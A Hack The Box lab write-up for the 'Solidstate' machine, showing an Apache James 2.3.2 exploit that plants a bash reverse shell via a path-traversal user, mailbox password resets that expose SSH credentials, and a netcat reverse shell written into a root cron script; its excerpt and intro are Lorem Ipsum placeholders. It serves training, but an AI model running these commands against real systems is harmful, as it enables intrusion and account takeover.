---
layout: single
title: Solidstate - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-03-08
classes: wide
header:
  teaser: /assets/images/htb-writeup-solidstate/solidstate_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-solidstate/solidstate_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. Standard enumeration - nmap, dirb, nikto.

[p3:/git/htb/solidstate]$ nmap -p- 10.10.10.51
  PORT     STATE SERVICE
  22/tcp   open  ssh
  25/tcp   open  smtp
  80/tcp   open  http
  110/tcp  open  pop3
  119/tcp  open  nntp
  4555/tcp open  rsip

[p3:/git/htb/solidstate]$ nmap -p 22,25,80,110,119,4555 -sCV 10.10.10.51
  PORT     STATE SERVICE     VERSION
  22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
  | ssh-hostkey:
  |   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
  |   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
  |_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
  25/tcp   open  smtp        JAMES smtpd 2.3.2
  |_smtp-commands: solidstate Hello solidstate.htb (10.10.14.3 [10.10.14.3]),
  80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
  |_http-server-header: Apache/2.4.25 (Debian)
  |_http-title: Home - Solid State Security
  110/tcp  open  pop3        JAMES pop3d 2.3.2
  119/tcp  open  nntp        JAMES nntpd (posting ok)
  4555/tcp open  james-admin JAMES Remote Admin 2.3.2

DIRB:
  ---- Scanning URL: http://10.10.10.51/ ----
  ==> DIRECTORY: http://10.10.10.51/assets/
  ==> DIRECTORY: http://10.10.10.51/images/
  + http://10.10.10.51/index.html (CODE:200|SIZE:7776)
  + http://10.10.10.51/server-status (CODE:403|SIZE:299)

NIKTO:
  -


2. Quick look at JAMES 2.3.2 we find a authenticated RCE (35513.py) vuln

[p3:/git/htb/solidstate]$ searchsploit JAMES
  --- snip ---
  Apache James Server 2.3.2 - Remote Command Execution                   | linux/remote/35513.py

The script logs in with default credentials (root:root) and creates the user '../../../../../../../../etc/bash_completion.d'.
Once created, an email containing a malicious payload will be sent which will be triggered once someone logs into the machine.

Modify the payload, execute and verify the results:

  [p3:/git/htb/solidstate]$ python 35513.py 10.10.10.51                                                                                               (master✱)
    [+]Connecting to James Remote Administration Tool...
    [+]Creating user...
    [+]Connecting to James SMTP server...
    [+]Sending payload...
    [+]Done! Payload will be executed once somebody logs in.

  [p3:/git/htb/solidstate]$ telnet 10.10.10.51 4555
    Trying 10.10.10.51...
    Connected to 10.10.10.51.
    Escape character is '^]'.
    JAMES Remote Administration Tool 2.3.2
    Please enter your login and password
    Login id:
      root
    Password:
      root
    Welcome root. HELP for a list of commands

    listusers
      Existing accounts 6
      user: james
      user: ../../../../../../../../etc/bash_completion.d
      user: thomas
      user: john
      user: mindy
      user: mailadmin
      user james

  [p3:/git/htb/solidstate]$ telnet 10.10.10.51 110                                                                                                    (master✱)
    Trying 10.10.10.51...
    Connected to 10.10.10.51.
    Escape character is '^]'.
    +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
    USER ../../../../../../../../etc/bash_completion.d
      +OK
    PASS exploit
      +OK Welcome ../../../../../../../../etc/bash_completion.d
    LIST
      +OK 2 1239
      1 600
      2 639
      .
    RETR 2
      +OK Message follows
      Return-Path: <'@team.pl>
      Message-ID: <6334054.1.1615365875656.JavaMail.root@solidstate>
      MIME-Version: 1.0
      Content-Type: text/plain; charset=us-ascii
      Content-Transfer-Encoding: 7bit
      Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
      Received: from 10.10.14.6 ([10.10.14.6])
                by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 471
                for <../../../../../../../../etc/bash_completion.d@localhost>;
                Wed, 10 Mar 2021 03:44:35 -0500 (EST)
      Date: Wed, 10 Mar 2021 03:44:35 -0500 (EST)
      From: team@team.pl

      '
      bash -i >& /dev/tcp/10.10.14.6/4488 0>&1

      .


3. As mentioned, to trigger the exploit we need to login to the machine some how. We can't find anything on port 80, so lets
   look through all users mailboxes.

  [p3:/git/htb/solidstate]$ telnet 10.10.10.51 4555                                                                                                   (master✱)
    Trying 10.10.10.51...
    Connected to 10.10.10.51.
    Escape character is '^]'.
    JAMES Remote Administration Tool 2.3.2
    Please enter your login and password
    Login id:
    root
    Password:
    root
    Welcome root. HELP for a list of commands
    setpassword john 123
      Password for john reset

  [p3:/git/htb/solidstate]$ telnet 10.10.10.51 110                                                                                                    (master✱)
    Trying 10.10.10.51...
    Connected to 10.10.10.51.
    Escape character is '^]'.
    +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
    USER john
      +OK
    PASS 123
      +OK Welcome john
    list
      +OK 1 743
      1 743
      .
    RETR 1
      +OK Message follows
      Return-Path: <mailadmin@localhost>
      Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
      MIME-Version: 1.0
      Content-Type: text/plain; charset=us-ascii
      Content-Transfer-Encoding: 7bit
      Delivered-To: john@localhost
      Received: from 192.168.11.142 ([192.168.11.142])
               by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
               for <john@localhost>;
               Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
      Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
      From: mailadmin@localhost
      Subject: New Hires access
      John,

      Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

      Thank you in advance.

      Respectfully,
      James


  [p3:/git/htb/solidstate]$ telnet 10.10.10.51 110                                                                                                    (master✱)
    Trying 10.10.10.51...
    Connected to 10.10.10.51.
    Escape character is '^]'.
    +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
    USER mindy
      +OK
    PASS 123
      +OK Welcome mindy
    list
      +OK 2 1945
      1 1109
      2 836
      .
    RETR 1
      +OK Message follows
      Return-Path: <mailadmin@localhost>
      Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
      MIME-Version: 1.0
      Content-Type: text/plain; charset=us-ascii
      Content-Transfer-Encoding: 7bit
      Delivered-To: mindy@localhost
      Received: from 192.168.11.142 ([192.168.11.142])
                by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
                for <mindy@localhost>;
                Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
      Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
      From: mailadmin@localhost
      Subject: Welcome

      Dear Mindy,
      Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

      We are looking forward to you joining our team and your success at Solid State Security.

      Respectfully,
      James
      .
    RETR 2
      +OK Message follows
      Return-Path: <mailadmin@localhost>
      Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
      MIME-Version: 1.0
      Content-Type: text/plain; charset=us-ascii
      Content-Transfer-Encoding: 7bit
      Delivered-To: mindy@localhost
      Received: from 192.168.11.142 ([192.168.11.142])
                by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
                for <mindy@localhost>;
                Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
      Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
      From: mailadmin@localhost
      Subject: Your Access

      Dear Mindy,


      Here are your ssh credentials to access the system. Remember to reset your password after your first login.
      Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.

      username: mindy
      pass: P@55W0rd1!2@

      Respectfully,
      James


4. We got creds for mindy:P@55W0rd1!2@, log in with SSH to trigger the expliot reverse shell.

  [p3:~]$ nc -lvnp 4488
    listening on [any] 4488 ...
    connect to [10.10.14.6] from (UNKNOWN) [10.10.10.51] 37728
    $ whoami
      mindy

The shell seems to trigger as the user whom logged in, however Mindys default shell is '/bin/rbash' - a restricted shell where
the user can't execute anything. With the reverse exploit, we are able to spawn a normal /bin/bash shell.

  mindy@solidstate:~$ cat user.txt
    0510e71c2e8c9cb333b36a38080d0dc2


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Enumerating the box we find a /opt/tmp.py, a writable script, owned by root, that cleans /tmp/. By looking at the code
   one would assume this is ran automatically and regularly. Verify this by creating a file in /tmp and wait.

   Modify the code, setup a listener, and wait (a few minutes) for a root shell.
   NOTE: You can verify your shell syntax by running 'python tmp.py' and see if you get the reverse as user mindy.

  ${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py
  #!/usr/bin/env python
  import os
  import sys
  try:
       os.system('nc -e /bin/bash 10.10.14.6 4499')
  except:
       sys.exit()


  [p3:...esome-scripts-suite/linPEAS]$ nc -lvnp 4499                                                                                                   (master)
    listening on [any] 4499 ...
    connect to [10.10.14.6] from (UNKNOWN) [10.10.10.51] 49756
    whoami
      root
    cat /root/root.txt
      4f4afb55463c3bc79ab1e906b074953d


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

James 2.3.2 Exploit:
  https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf

POP3:
  https://book.hacktricks.xyz/pentesting/pentesting-pop
